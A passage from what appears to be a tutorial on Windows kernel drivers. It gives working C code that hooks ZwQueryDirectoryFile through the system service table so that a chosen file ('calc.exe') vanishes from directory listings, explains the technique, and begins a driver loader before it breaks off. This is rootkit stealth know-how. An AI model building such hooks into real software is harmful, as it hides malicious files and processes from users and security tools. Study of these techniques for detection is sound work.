style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeServiceDescriptorTable.ServiceTableBase[no]=(unsigned
int)NewZwQueryDirectoryFile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_asm
sti<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>FileInfoClass
=3 rc=0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c
Length=6 Delta=104<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r10
Length=6 Delta=104<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>a.obj
Length=10 Delta=0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>FileInfoClass=3
rc=0<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Lots
of good folk on the internet whispered into our ear that each time we do a dir,
the list of files supplied to the dir command come from the undocumented
function ZwQueryDirectoryFile. Any function beginning with Zw is undocumented.
So far we have been able to hide a running program from windows. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Not
good enough because if we are able to hide say calc from task manager all that
someone may day is dir /s for calc.exe and find it on the hard disk. Thus lets
us now hide a file from dir. Thus we will be able to hide both file and program
from windows spying eyes. In the above program we hook the ZwQueryDirectoryFile
function and like always the function NewZwQueryDirectoryFile gets called. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>As
before we call the original and then do our thing. This function gets called
with a zillion parameters but we are interested in only two. The FileInfoClass
parameter can take lots of values depending upon type of directory listing
asked for. The value 3 is the one we are interested in because directory
listing use this value. Like the function ZwQuerySystemInformation the return
value is important as we normally call these functions asking for length of
buffer. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Thus
we do our bit only when we get a return value of 0 and the FileInfoClass value
of 3. The second parameter of use is the FileInformationBuffer parameter. When
the FileInfoClass parameter is 3, this is a pointer to a FILE_BOTH_DIR_INFORMATION
structure. This structure is our creation and the first member is a offset to a
similar structure. This is because the FileInformationBuffer is made of a
series of FILE_BOTH_DIR_INFORMATION structures. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Unlike
a link list where a member points to the next member of the link list, here we
have a offset to the next member. The other problem is that when the member
NextEntryOffset is 0, it is not the end of the link list but the last member.
Thus we cannot loop till NextEntryOffset is 0, because then we will miss the
last file name. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Thus
the FileInformationBuffer is a series of structures, one per file in the
listing. We set a variable last to 0 and loop until some one makes last 1. The
minute the member NextEntryOffset is 0, we set last to 1 so that at the next
iteration not the current we quit out. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
FileName member is a unicode string to the actual file name. This is why the
structure used does not have a fixed size. There is no 0 at the end of this
string and therefore<span style="mso-spacerun: yes">  </span>we use the unicode
strcpy wcsncpy to copy the unicode string pointed by the FileName member. The
FileNameLength tells us the total length as actual bytes not unicode bytes. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Thus
file name r.c has a length of 6 and not 3. The unicode functions assume that we
are dealing with unicode characters and thus we have to divide the length by 2.
We copy this file name into a global array uFileName. As there is no null
terminator, we have to add a zero at the end./ Once again we divide by 2 as the
array is insigne short. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>When
we were writing our code, we would null terminate the FileName variable which
overwrote the NextEntryOffset member. This is because these structures are
stored back to back but we do not know the length of the file name and<span
style="mso-spacerun: yes">  </span>hence these structures. We print out
FileName and the length and the NextEntryOffset which either is an offset to
the next structure or 0 if it is last one. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P63<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
NewZwQueryDirectoryFile(HANDLE hFile,HANDLE hEvent,PIO_APC_ROUTINE
IoApcRoutine,PVOID IoApcContext,PIO_STATUS_BLOCK pIoStatusBlock,PVOID
FileInformationBuffer,ULONG FileInformationBufferLength,FILE_INFORMATION_CLASS
FileInfoClass,BOOLEAN bReturnOnlyOneEntry,PUNICODE_STRING PathMask,BOOLEAN
bRestartQuery)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
rc;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>rc=OldZwQueryDirectoryFile(hFile,hEvent,IoApcRoutine,IoApcContext,pIoStatusBlock,FileInformationBuffer,FileInformationBufferLength,FileInfoClass,bReturnOnlyOneEntry,PathMask,bRestartQuery);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;FileInfoClass=%d
rc=%d\n&quot;,FileInfoClass,rc);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(
rc == 0 &amp;&amp; FileInfoClass == 3)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>FILE_BOTH_DIR_INFORMATION
*p,*prev;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
last = 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= prev = (FILE_BOTH_DIR_INFORMATION *)FileInformationBuffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>while(!last)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( p-&gt;NextEntryOffset == 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>last
= 1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>wcsncpy(uFileName,p-&gt;FileName,p-&gt;FileNameLength/2);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>uFileName[p-&gt;FileNameLength/2]
= 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( wcsncmp(p-&gt;FileName,L&quot;calc.exe&quot;,8)<span style="mso-spacerun:
yes">  </span>== 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Match
Found prev=%d p=%d
last=%d&quot;,prev-&gt;NextEntryOffset,p-&gt;NextEntryOffset,last);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( p-&gt;NextEntryOffset == 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>prev-&gt;NextEntryOffset
= 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>else<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>prev-&gt;NextEntryOffset
= prev-&gt;NextEntryOffset + p-&gt;NextEntryOffset;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>prev
= p;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p
= (FILE_BOTH_DIR_INFORMATION *)((char *)p + (int)p-&gt;NextEntryOffset);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(rc);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Before
running the above program we would like to you copy calc.exe
fromC:\winnt\system32. This is the file we are going to hide. We use the
unicode equivalent of strncmp wcsncmp to compare two unicode strings. One is
p-&gt;FileName, the current file name and the other is a hard coded unicode
string L”calc.exe”. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Once
again we check for a certain number of bytes, using the ascii length 8 and not
the unicode length 16. If this function returns a zero, we know that we have
found a match. We have to check for three cases. The first is that if
NextEntryOffset is zero, the match is found on the last one. This happens when
we have more than one file as our output and this is the last file in the list.
<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
have also added one more variable prev which points to the previous structure,
one that we have just visited. Thus p points to the current structure, prev to
the last and we set prev to the last just when we are changing p. The problem
with the last entry is that there is no one in front of it. The NextEntryOffset
is an offset to the next structure. Thus the prev-&gt; NextEntryOffset offsets
to p. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>All
that we do is set it to 0, making the second last one the last. If it is in the
middle than we have to simply take the NextEntryOffset of the previous one and
set it to the next one and not the current one. All that we do is simply add
the offset of the current one so that it points to the next one, bypassing us
totally. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Thus
we have accounted for two cases, when the file we are trying to hide is in the
middle and the last one. But what if it is the first. Then we have a problem.
There are two cases, one when it is the only one in the list and the second when
there are many but this is the only one. We cannot use prev here is there is no
prev. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
cannot change the buffer as we are not passed the address of the buffer. Lets
carry on and resolve this issue a little later.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P63<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>y.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;malloc.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;tlhelp32.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#define
DRV_NAME &quot;vijayd&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#define
DRV_FILENAME &quot;vijay.sys&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#define
DIRECTORY &quot;C:\\driverm&quot;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef
struct<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">  </span>unsigned short<span style="mso-spacerun:
yes">  </span>Length;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">  </span>unsigned short<span style="mso-spacerun:
yes">  </span>MaximumLength;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char
* Buffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
ANSI_STRING, *PANSI_STRING;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>typedef
struct <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">  </span>unsigned short<span style="mso-spacerun:
yes">  </span>Length;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">  </span>unsigned short<span style="mso-spacerun:
yes">  </span>MaximumLength;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">  </span>unsigned short *Buffer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
UNICODE_STRING, *PUNICODE_STRING;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
(_stdcall * _RtlAnsiStringToUnicodeString)(PUNICODE_STRING<span
style="mso-spacerun: yes">  </span>DestinationString,PANSI_STRING<span
style="mso-spacerun: yes">  </span>SourceString,unsigned char);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
(_stdcall *_RtlInitAnsiString)(PANSI_STRING<span style="mso-spacerun: yes"> 
</span>DestinationString,char *<span style="mso-spacerun: yes"> 
</span>SourceString);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
(_stdcall * _ZwLoadDriver)(PUNICODE_STRING DriverServiceName);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
(_stdcall * _ZwUnloadDriver)(PUNICODE_STRING DriverServiceName);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ANSI_STRING
aStr;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>UNICODE_STRING
uStr;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>HMODULE
hntdll;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
long byteRet;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>HANDLE
hDevice;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>HKEY
hkey;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DWORD
val,b;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char
*imgName = &quot;System32\\DRIVERS\\&quot;DRV_FILENAME;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>void
main(int argc, char* argv[])<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>hntdll
= GetModuleHandle(&quot;ntdll.dll&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_ZwLoadDriver
= GetProcAddress(hntdll, &quot;NtLoadDriver&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_ZwUnloadDriver
= GetProcAddress(hntdll, &quot;NtUnloadDriver&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_RtlAnsiStringToUnicodeString
= GetProcAddress(hntdll, &quot;RtlAnsiStringToUnicodeString&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>_RtlInitAnsiString
= GetProcAddress(hntdll, &quot;RtlInitAnsiString&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( strcmp(argv[1],&quot;-i&quot;) == 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

